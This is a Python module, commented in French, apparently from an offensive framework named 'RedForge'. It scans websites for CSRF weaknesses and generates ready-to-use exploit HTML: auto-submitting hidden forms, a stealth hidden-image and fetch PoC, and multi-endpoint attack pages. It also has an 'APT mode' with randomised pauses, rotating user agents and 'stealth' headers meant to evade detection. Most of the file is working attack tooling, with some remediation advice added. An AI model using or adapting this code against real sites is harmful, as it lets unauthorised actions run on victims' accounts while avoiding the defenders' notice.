#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Module de génération d'attaques CSRF pour RedForge
Détecte et génère des exploits pour les vulnérabilités CSRF
Version avec support furtif, APT et techniques avancées
"""

import re
import time
import random
import hashlib
import requests
import json
from typing import Dict, Any, List, Optional, Tuple, Set
from dataclasses import dataclass, field
from urllib.parse import urlparse, parse_qs, urljoin, urlencode
from bs4 import BeautifulSoup
from collections import defaultdict

@dataclass
class CSRFConfig:
    """Configuration avancée pour la détection CSRF"""
    # Délais
    delay_between_requests: Tuple[float, float] = (0.5, 1.5)
    delay_between_forms: Tuple[float, float] = (1, 3)
    
    # Comportement
    extract_all_forms: bool = True
    test_api_endpoints: bool = True
    deep_scan: bool = False
    follow_redirects: bool = False
    
    # Furtivité
    stealth_headers: bool = True
    random_user_agents: bool = True
    random_delays: bool = True
    
    # APT
    apt_mode: bool = False
    passive_detection: bool = False
    avoid_detection: bool = True
    
    # Analyse avancée
    test_json_endpoints: bool = True
    test_custom_headers: bool = True
    detect_csrf_in_js: bool = True
    test_samesite_cookies: bool = True


class CSRFGenerator:
    """Génération avancée d'attaques CSRF"""
    
    def __init__(self, config: Optional[CSRFConfig] = None):
        """
        Initialise le générateur d'attaques CSRF
        
        Args:
            config: Configuration personnalisée
        """
        self.config = config or CSRFConfig()
        
        # Patterns de tokens CSRF
        self.csrf_tokens_patterns = [
            r'name=["\']csrf["\'][^>]*value=["\']([^"\']+)["\']',
            r'name=["\']_token["\'][^>]*value=["\']([^"\']+)["\']',
            r'name=["\']csrf_token["\'][^>]*value=["\']([^"\']+)["\']',
            r'name=["\']authenticity_token["\'][^>]*value=["\']([^"\']+)["\']',
            r'name=["\']xsrf-token["\'][^>]*value=["\']([^"\']+)["\']',
            r'<meta name=["\']csrf-token["\'][^>]+content=["\']([^"\']+)["\']',
            r'name=["\']csrfmiddlewaretoken["\'][^>]*value=["\']([^"\']+)["\']',
            r'data-csrf=["\']([^"\']+)["\']',
            r'csrf-token["\']?\s*:\s*["\']([^"\']+)["\']'
        ]
        
        # Headers CSRF courants
        self.csrf_headers = [
            'X-CSRF-Token',
            'X-CSRF-TOKEN',
            'X-XSRF-TOKEN',
            'CSRF-Token',
            'X-CSRF-Protection',
            'X-CSRF-Header',
            'X-Requested-With'
        ]
        
        # Patterns SameSite
        self.samesite_patterns = {
            'Strict': 'secure',
            'Lax': 'partial',
            'None': 'vulnerable',
            None: 'vulnerable'
        }
        
        # User agents pour furtivité
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36'
        ]
        
        # Métriques
        self.start_time = None
        self.forms_analyzed = 0
        self.vulnerabilities_found = 0
        self.tokens_extracted = 0
    
    def scan(self, target: str, **kwargs) -> Dict[str, Any]:
        """
        Scanne les vulnérabilités CSRF
        
        Args:
            target: URL cible
            **kwargs: Options de configuration
                - forms: Analyser les formulaires
                - actions: Actions à tester
                - depth: Profondeur de scan
                - apt_mode: Mode APT
        """
        self.start_time = time.time()
        self.forms_analyzed = 0
        self.vulnerabilities_found = 0
        self.tokens_extracted = 0
        
        # Mettre à jour la configuration
        self._update_config(kwargs)
        
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        
        print(f"  → Test des CSRF sur {target}")
        if self.config.apt_mode:
            print(f"  🕵️ Mode APT activé - Détection discrète")
        
        vulnerabilities = []
        forms_analyzed = []
        endpoints_tested = set()
        
        # Analyser les formulaires
        if kwargs.get('forms', True) and self.config.extract_all_forms:
            forms = self._extract_forms(target)
            
            for idx, form in enumerate(forms):
                # Pause APT
                if self.config.apt_mode and idx > 0:
                    self._apt_pause()
                elif self.config.random_delays and idx > 0:
                    time.sleep(random.uniform(*self.config.delay_between_forms))
                
                analysis = self._analyze_form(target, form)
                self.forms_analyzed += 1
                forms_analyzed.append(analysis)
                
                if analysis['vulnerable']:
                    self.vulnerabilities_found += 1
                    vulnerabilities.append({
                        "endpoint": analysis['action'],
                        "method": analysis['method'],
                        "severity": "HIGH",
                        "details": analysis['details'],
                        "csrf_token": analysis.get('csrf_token'),
                        "risk_score": analysis.get('risk_score', 85),
                        "fields": analysis.get('fields', 0)
                    })
                    print(f"      ✓ CSRF détecté sur {analysis['action']}")
        
        # Tester les actions API
        if self.config.test_api_endpoints:
            actions = kwargs.get('actions', [])
            api_results = self._test_api_endpoints(target, actions)
            for result in api_results:
                if result['vulnerable'] and result['endpoint'] not in endpoints_tested:
                    endpoints_tested.add(result['endpoint'])
                    self.vulnerabilities_found += 1
                    vulnerabilities.append(result)
                    print(f"      ✓ CSRF sur API: {result['endpoint']}")
        
        # Analyser les cookies SameSite
        if self.config.test_samesite_cookies:
            samesite_analysis = self._analyze_samesite_cookies(target)
            if samesite_analysis.get('vulnerable'):
                vulnerabilities.append(samesite_analysis)
                print(f"      ✓ Cookie SameSite vulnérable: {samesite_analysis['details']}")
        
        # Détection CSRF dans JavaScript
        if self.config.detect_csrf_in_js:
            js_tokens = self._find_csrf_in_javascript(target)
            if js_tokens:
                for token in js_tokens:
                    vulnerabilities.append({
                        "endpoint": target,
                        "severity": "MEDIUM",
                        "details": f"Token CSRF exposé dans JavaScript: {token[:50]}...",
                        "risk_score": 60
                    })
        
        return self._generate_results(target, vulnerabilities, forms_analyzed)
    
    def _update_config(self, kwargs: Dict):
        """Met à jour la configuration avec les kwargs"""
        if 'depth' in kwargs:
            self.config.deep_scan = kwargs['depth'] == 'full'
        if 'extract_all_forms' in kwargs:
            self.config.extract_all_forms = kwargs['extract_all_forms']
        if 'test_api_endpoints' in kwargs:
            self.config.test_api_endpoints = kwargs['test_api_endpoints']
        
        # Mode APT
        if kwargs.get('apt_mode', False) or kwargs.get('stealth_level') == 'apt':
            self.config.apt_mode = True
            self.config.passive_detection = True
            self.config.avoid_detection = True
            self.config.stealth_headers = True
            self.config.random_delays = True
            self.config.delay_between_forms = (5, 15)
            self.config.extract_all_forms = False  # Limiter en mode APT
    
    def _get_stealth_headers(self, additional_headers: Optional[Dict] = None) -> Dict[str, str]:
        """Génère des headers furtifs"""
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        }
        
        if self.config.random_user_agents:
            headers['User-Agent'] = random.choice(self.user_agents)
        
        if self.config.stealth_headers:
            headers['Cache-Control'] = 'no-cache'
            headers['Pragma'] = 'no-cache'
        
        if additional_headers:
            headers.update(additional_headers)
        
        return headers
    
    def _extract_forms(self, target: str) -> List[Dict[str, Any]]:
        """
        Extrait les formulaires de la page cible
        
        Args:
            target: URL cible
        """
        forms = []
        
        try:
            headers = self._get_stealth_headers()
            response = requests.get(target, headers=headers, timeout=10, verify=False)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Extraire les formulaires
            for form in soup.find_all('form'):
                action = form.get('action', '')
                if not action.startswith(('http://', 'https://')):
                    action = urljoin(target, action)
                
                method = form.get('method', 'GET').upper()
                
                # Extraire les champs
                fields = []
                for input_tag in form.find_all(['input', 'textarea', 'select', 'button']):
                    field = {
                        'name': input_tag.get('name', ''),
                        'type': input_tag.get('type', 'text'),
                        'value': input_tag.get('value', '')
                    }
                    if field['name']:
                        fields.append(field)
                
                forms.append({
                    'action': action,
                    'method': method,
                    'fields': fields,
                    'html': str(form)[:500]  # Tronqué pour performance
                })
            
            # Limiter en mode APT
            if self.config.apt_mode:
                forms = forms[:10]
                
        except Exception as e:
            if not self.config.passive_detection:
                print(f"    ⚠️ Erreur extraction formulaires: {e}")
        
        return forms
    
    def _analyze_form(self, base_url: str, form: Dict[str, Any]) -> Dict[str, Any]:
        """
        Analyse un formulaire pour les vulnérabilités CSRF
        
        Args:
            base_url: URL de base
            form: Formulaire à analyser
        """
        analysis = {
            "action": form['action'],
            "method": form['method'],
            "vulnerable": False,
            "details": None,
            "csrf_token": None,
            "fields": len(form['fields']),
            "risk_score": 0
        }
        
        # Vérifier la présence de token CSRF
        csrf_found = False
        csrf_field_name = None
        
        for field in form['fields']:
            field_name = field['name'].lower()
            field_type = field['type'].lower()
            
            # Patterns de token CSRF
            if any(pattern in field_name for pattern in ['csrf', 'token', 'authenticity', 'xsrf']):
                csrf_found = True
                csrf_field_name = field['name']
                self.tokens_extracted += 1
                break
        
        # Vérifier les en-têtes CSRF
        if not csrf_found:
            try:
                headers = self._get_stealth_headers()
                response = requests.options(form['action'], headers=headers, timeout=10, verify=False)
                for header in self.csrf_headers:
                    if header in response.headers:
                        csrf_found = True
                        break
            except:
                pass
        
        # Évaluation de la vulnérabilité
        if not csrf_found:
            analysis["vulnerable"] = True
            analysis["details"] = "Absence de token CSRF détecté"
            analysis["risk_score"] = 85
            
            # Vérifier si la méthode GET est utilisée pour des actions sensibles
            if form['method'] == 'GET' and self._is_sensitive_action(form['action']):
                analysis["details"] += " - Méthode GET pour action sensible"
                analysis["risk_score"] = 90
        
        # Token présent mais peut-être faible
        elif csrf_field_name:
            analysis["csrf_token"] = csrf_field_name
            # Vérifier si le token est prévisible
            token_value = next((f['value'] for f in form['fields'] if f['name'] == csrf_field_name), None)
            if token_value and self._is_weak_token(token_value):
                analysis["vulnerable"] = True
                analysis["details"] = "Token CSRF faible/prévisible"
                analysis["risk_score"] = 75
        
        return analysis
    
    def _is_weak_token(self, token: str) -> bool:
        """Détecte si un token CSRF est faible"""
        weak_patterns = [
            r'^\d+$',  # Seulement des chiffres
            r'^[a-z]+$',  # Seulement des lettres minuscules
            r'^[A-Z]+$',  # Seulement des lettres majuscules
            r'^.{1,8}$',  # Trop court (< 8 caractères)
            r'^123456|password|admin|test'  # Valeurs communes
        ]
        
        for pattern in weak_patterns:
            if re.match(pattern, token):
                return True
        return False
    
    def _is_sensitive_action(self, action: str) -> bool:
        """
        Détermine si une action est sensible
        
        Args:
            action: URL de l'action
        """
        sensitive_keywords = [
            'delete', 'remove', 'update', 'edit', 'change', 'modify',
            'upload', 'create', 'add', 'transfer', 'pay', 'order',
            'admin', 'config', 'setting', 'profile', 'password',
            'email', 'role', 'permission', 'grant', 'revoke'
        ]
        
        action_lower = action.lower()
        return any(keyword in action_lower for keyword in sensitive_keywords)
    
    def _test_api_endpoints(self, base_url: str, endpoints: List[str]) -> List[Dict[str, Any]]:
        """
        Teste des endpoints API pour les vulnérabilités CSRF
        
        Args:
            base_url: URL de base
            endpoints: Liste des endpoints à tester
        """
        results = []
        
        # Endpoints API par défaut si non spécifiés
        if not endpoints:
            default_endpoints = [
                '/api/user', '/api/profile', '/api/settings', '/api/config',
                '/admin/api', '/api/delete', '/api/update', '/api/create',
                '/graphql', '/api/graphql', '/api/v1/users', '/api/v2/users'
            ]
            endpoints = default_endpoints
        
        for endpoint in endpoints:
            full_url = base_url.rstrip('/') + '/' + endpoint.lstrip('/')
            
            try:
                # Tester si l'endpoint accepte les requêtes cross-origin
                headers = self._get_stealth_headers({
                    'Origin': 'https://evil.com',
                    'X-Requested-With': 'XMLHttpRequest'
                })
                
                response = requests.get(full_url, headers=headers, timeout=10, verify=False)
                
                # Vérifier les en-têtes CSRF
                csrf_protected = False
                for header in self.csrf_headers:
                    if header in response.headers or header.lower() in str(response.headers):
                        csrf_protected = True
                        break
                
                # Vérifier les tokens dans les cookies
                if not csrf_protected:
                    for cookie in response.cookies:
                        if any(pattern in cookie.name.lower() for pattern in ['csrf', 'token', 'xsrf']):
                            csrf_protected = True
                            break
                
                # Vérifier la méthode GET pour actions sensibles
                is_sensitive = self._is_sensitive_action(full_url)
                
                if not csrf_protected or (is_sensitive and response.status_code == 200):
                    results.append({
                        "endpoint": endpoint,
                        "severity": "HIGH",
                        "details": "Endpoint API sans protection CSRF" if not csrf_protected else "Endpoint API sensible accessible via GET",
                        "vulnerable": True,
                        "risk_score": 85,
                        "method_tested": "GET"
                    })
                    
            except Exception as e:
                if not self.config.passive_detection:
                    pass
        
        return results
    
    def _analyze_samesite_cookies(self, target: str) -> Dict[str, Any]:
        """
        Analyse les cookies SameSite pour les vulnérabilités CSRF
        
        Args:
            target: URL cible
        """
        result = {
            "vulnerable": False,
            "details": None,
            "severity": "MEDIUM",
            "risk_score": 70
        }
        
        try:
            headers = self._get_stealth_headers()
            response = requests.get(target, headers=headers, timeout=10, verify=False)
            
            vulnerable_cookies = []
            
            for cookie in response.cookies:
                samesite = getattr(cookie, 'same_site', None)
                
                if samesite == 'None' or samesite is None:
                    vulnerable_cookies.append({
                        'name': cookie.name,
                        'samesite': samesite or 'Not set'
                    })
            
            if vulnerable_cookies:
                result["vulnerable"] = True
                result["details"] = f"Cookies sans SameSite ou SameSite=None: {len(vulnerable_cookies)} cookies"
                result["cookies"] = vulnerable_cookies
                result["risk_score"] = 75
                
        except Exception:
            pass
        
        return result
    
    def _find_csrf_in_javascript(self, target: str) -> List[str]:
        """
        Cherche des tokens CSRF exposés dans les fichiers JavaScript
        
        Args:
            target: URL cible
        """
        tokens = []
        
        try:
            headers = self._get_stealth_headers()
            response = requests.get(target, headers=headers, timeout=10, verify=False)
            
            # Chercher les fichiers JS
            soup = BeautifulSoup(response.text, 'html.parser')
            js_files = [script.get('src') for script in soup.find_all('script') if script.get('src')]
            
            for js_file in js_files[:10]:  # Limiter pour performance
                if not js_file.startswith(('http://', 'https://')):
                    js_file = urljoin(target, js_file)
                
                try:
                    js_response = requests.get(js_file, headers=headers, timeout=5, verify=False)
                    
                    # Chercher des patterns de tokens
                    for pattern in self.csrf_tokens_patterns:
                        matches = re.findall(pattern, js_response.text, re.IGNORECASE)
                        tokens.extend(matches[:5])  # Limiter par fichier
                        
                except Exception:
                    continue
                    
        except Exception:
            pass
        
        return list(set(tokens))[:20]  # Dédupliquer et limiter
    
    def _apt_pause(self):
        """Pause APT pour simuler un comportement humain"""
        if random.random() < 0.3:
            pause_duration = random.uniform(30, 120)
            print(f"      💤 Pause APT: {pause_duration:.0f}s")
            time.sleep(pause_duration)
    
    def _generate_results(self, target: str, vulnerabilities: List[Dict], 
                         forms_analyzed: List[Dict]) -> Dict[str, Any]:
        """Génère les résultats de l'attaque"""
        duration = time.time() - self.start_time
        
        # Calculer les scores
        critical_count = len([v for v in vulnerabilities if v.get('severity') == 'CRITICAL'])
        high_count = len([v for v in vulnerabilities if v.get('severity') == 'HIGH'])
        medium_count = len([v for v in vulnerabilities if v.get('severity') == 'MEDIUM'])
        
        return {
            "target": target,
            "vulnerabilities": vulnerabilities,
            "forms_analyzed": forms_analyzed,
            "count": len(vulnerabilities),
            "forms_analyzed_count": len(forms_analyzed),
            "tokens_extracted": self.tokens_extracted,
            "scan_duration": duration,
            "severity_counts": {
                "CRITICAL": critical_count,
                "HIGH": high_count,
                "MEDIUM": medium_count
            },
            "config": {
                "apt_mode": self.config.apt_mode,
                "deep_scan": self.config.deep_scan,
                "test_api_endpoints": self.config.test_api_endpoints
            },
            "summary": self._generate_summary(vulnerabilities),
            "recommendations": self._generate_recommendations(vulnerabilities)
        }
    
    def _generate_summary(self, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """Génère un résumé des vulnérabilités"""
        if not vulnerabilities:
            return {"total": 0, "severity": "INFO", "message": "Aucune vulnérabilité CSRF détectée"}
        
        return {
            "total": len(vulnerabilities),
            "high_risk": len([v for v in vulnerabilities if v.get('risk_score', 0) >= 80]),
            "max_risk_score": max([v.get('risk_score', 0) for v in vulnerabilities]) if vulnerabilities else 0
        }
    
    def _generate_recommendations(self, vulnerabilities: List[Dict]) -> List[str]:
        """Génère des recommandations basées sur les vulnérabilités trouvées"""
        recommendations = set()
        
        for vuln in vulnerabilities:
            details = vuln.get('details', '').lower()
            
            if 'absence de token csrf' in details:
                recommendations.add("Implémenter des tokens CSRF pour tous les formulaires sensibles")
                recommendations.add("Utiliser le pattern Synchronizer Token")
            
            if 'méthode get' in details:
                recommendations.add("Éviter d'utiliser GET pour les actions modifiant l'état")
                recommendations.add("Appliquer le principe REST: GET pour lecture, POST pour écriture")
            
            if 'token csrf faible' in details:
                recommendations.add("Générer des tokens CSRF cryptographiquement forts")
                recommendations.add("Utiliser une longueur minimale de 32 caractères")
            
            if 'api sans protection' in details:
                recommendations.add("Protéger les endpoints API avec des tokens CSRF ou JWT")
                recommendations.add("Vérifier l'en-tête Origin/Referer")
            
            if 'samesite' in details:
                recommendations.add("Configurer SameSite=Lax ou SameSite=Strict pour les cookies")
                recommendations.add("Éviter SameSite=None pour les cookies sensibles")
        
        if not recommendations:
            recommendations.add("Auditer régulièrement la protection CSRF")
            recommendations.add("Implémenter une politique de sécurité CSRF complète")
        
        return list(recommendations)
    
    def generate_exploit_forms(self, action_url: str = None, method: str = 'POST',
                               parameters: Dict[str, str] = None, 
                               auto_submit: bool = True) -> str:
        """
        Génère des formulaires HTML d'exploit CSRF
        
        Args:
            action_url: URL cible (optionnel)
            method: Méthode HTTP
            parameters: Paramètres à inclure
            auto_submit: Soumission automatique
        """
        if parameters is None:
            parameters = {}
        
        if action_url:
            action_url_placeholder = action_url
        else:
            action_url_placeholder = "ACTION_URL"
        
        inputs = ''.join([f'        <input type="hidden" name="{k}" value="{v}">\n' 
                         for k, v in parameters.items()])
        
        auto_submit_script = '''
    <script>
        // Soumission automatique
        document.getElementById('csrf-form').submit();
    </script>''' if auto_submit else ''
        
        exploit_html = f'''<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>CSRF Exploit - RedForge</title>
    <style>
        body {{
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0;
            padding: 20px;
        }}
        .container {{
            background: white;
            border-radius: 10px;
            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.25);
            padding: 30px;
            max-width: 500px;
            width: 100%;
        }}
        h1 {{
            color: #2d3748;
            margin-bottom: 10px;
        }}
        .warning {{
            background: #fed7d7;
            color: #c53030;
            padding: 10px;
            border-radius: 5px;
            margin: 20px 0;
            font-size: 14px;
        }}
        .info {{
            background: #e2e8f0;
            padding: 10px;
            border-radius: 5px;
            font-size: 12px;
            color: #4a5568;
            margin-top: 20px;
        }}
        button {{
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            width: 100%;
            margin-top: 20px;
        }}
        button:hover {{
            transform: translateY(-2px);
        }}
        code {{
            background: #f7fafc;
            padding: 2px 5px;
            border-radius: 3px;
            font-family: monospace;
            font-size: 12px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <h1>🎯 CSRF Exploit</h1>
        <p>RedForge Security Testing Framework</p>
        
        <div class="warning">
            ⚠️ Ce formulaire va déclencher une requête CSRF vers <code>{action_url_placeholder}</code>
        </div>
        
        <form id="csrf-form" action="{action_url_placeholder}" method="{method}">
{inputs}        <button type="submit">Cliquez ici pour continuer</button>
        </form>
        {auto_submit_script}
        
        <div class="info">
            <strong>📋 Informations</strong><br>
            Méthode: {method}<br>
            Paramètres: {len(parameters)}<br>
            Soumission automatique: {auto_submit}
        </div>
    </div>
</body>
</html>'''
        
        return exploit_html
    
    def generate_poc(self, action_url: str, method: str = 'POST', 
                     parameters: Dict[str, str] = None,
                     stealth: bool = False) -> str:
        """
        Génère une preuve de concept CSRF personnalisée
        
        Args:
            action_url: URL de l'action vulnérable
            method: Méthode HTTP (GET/POST)
            parameters: Paramètres à inclure
            stealth: Mode furtif (sans éléments visibles)
        """
        if parameters is None:
            parameters = {}
        
        if method.upper() == 'GET':
            # Exploit via image
            param_str = '&'.join([f"{k}={v}" for k, v in parameters.items()])
            url = f"{action_url}?{param_str}" if param_str else action_url
            
            if stealth:
                poc = f'''<!DOCTYPE html>
<html>
<body>
    <img src="{url}" style="display:none" />
    <script>fetch('{url}', {{method: 'GET', mode: 'no-cors'}});</script>
</body>
</html>'''
            else:
                poc = f'''<!DOCTYPE html>
<html>
<head><title>CSRF PoC - RedForge</title></head>
<body>
    <h1>CSRF Proof of Concept</h1>
    <p>Cette page va automatiquement déclencher une requête CSRF.</p>
    <p>Cible: <code>{action_url}</code></p>
    <p>Méthode: GET</p>
    <img src="{url}" style="display:none">
    <script>
        fetch('{url}', {{ method: 'GET', mode: 'no-cors' }});
        console.log('CSRF exploit exécuté');
    </script>
</body>
</html>'''
        else:
            # Exploit via formulaire
            inputs = ''.join([f'    <input type="hidden" name="{k}" value="{v}">\n' 
                             for k, v in parameters.items()])
            
            if stealth:
                poc = f'''<!DOCTYPE html>
<html>
<body>
    <form id="csrf" action="{action_url}" method="POST">
{inputs}    </form>
    <script>document.getElementById('csrf').submit();</script>
</body>
</html>'''
            else:
                poc = f'''<!DOCTYPE html>
<html>
<head><title>CSRF PoC - RedForge</title></head>
<body>
    <h1>CSRF Proof of Concept</h1>
    <p>Cible: <code>{action_url}</code></p>
    <p>Méthode: POST</p>
    <form id="csrf" action="{action_url}" method="POST">
{inputs}    </form>
    <button onclick="document.getElementById('csrf').submit();">Déclencher CSRF</button>
    <script>
        // Soumission automatique après 1 seconde
        setTimeout(() => {{
            document.getElementById('csrf').submit();
        }}, 1000);
    </script>
</body>
</html>'''
        
        return poc
    
    def generate_multi_endpoint_exploit(self, endpoints: List[Tuple[str, str, Dict[str, str]]]) -> str:
        """
        Génère un exploit multi-endpoints pour tester plusieurs vulnérabilités
        
        Args:
            endpoints: Liste de (url, method, parameters)
        """
        exploits = []
        
        for url, method, params in endpoints:
            if method.upper() == 'GET':
                param_str = '&'.join([f"{k}={v}" for k, v in params.items()])
                full_url = f"{url}?{param_str}" if param_str else url
                exploits.append(f'<img src="{full_url}" style="display:none">')
                exploits.append(f'<script>fetch("{full_url}", {{method: "GET", mode: "no-cors"}});</script>')
            else:
                inputs = ''.join([f'<input type="hidden" name="{k}" value="{v}">' for k, v in params.items()])
                form_id = f"csrf_form_{hash(url) % 10000}"
                exploits.append(f'''
    <form id="{form_id}" action="{url}" method="POST" style="display:none">
        {inputs}
    </form>
    <script>document.getElementById("{form_id}").submit();</script>
                ''')
        
        exploit_html = f'''<!DOCTYPE html>
<html>
<head>
    <title>Multi-Endpoint CSRF Exploit - RedForge</title>
</head>
<body>
    <h1>Multi-Endpoint CSRF Exploit</h1>
    <p>Exploitation de {len(endpoints)} endpoints vulnérables</p>
    {''.join(exploits)}
    <script>
        console.log('Multi-endpoint CSRF exploit exécuté');
    </script>
</body>
</html>'''
        
        return exploit_html
    
    def get_statistics(self) -> Dict[str, Any]:
        """Retourne les statistiques de détection"""
        return {
            "forms_analyzed": self.forms_analyzed,
            "vulnerabilities_found": self.vulnerabilities_found,
            "tokens_extracted": self.tokens_extracted,
            "success_rate": (self.vulnerabilities_found / self.forms_analyzed * 100) if self.forms_analyzed > 0 else 0,
            "scan_duration": time.time() - self.start_time if self.start_time else 0
        }


# Point d'entrée pour tests
if __name__ == "__main__":
    # Test mode normal
    print("=== Test mode normal ===")
    generator = CSRFGenerator()
    results = generator.scan("https://example.com")
    print(f"Vulnérabilités CSRF: {results['count']}")
    
    # Test mode APT
    print("\n=== Test mode APT ===")
    apt_config = CSRFConfig(apt_mode=True, passive_detection=True)
    generator_apt = CSRFGenerator(config=apt_config)
    results_apt = generator_apt.scan("https://example.com", apt_mode=True)
    print(f"Vulnérabilités CSRF (APT): {results_apt['count']}")
    
    # Générer exploit
    if results_apt['vulnerabilities']:
        poc = generator_apt.generate_poc(
            "https://example.com/delete",
            method="POST",
            parameters={"id": "1", "confirm": "yes"}
        )
        with open("csrf_poc.html", "w") as f:
            f.write(poc)
        print("Exploit CSRF généré: csrf_poc.html")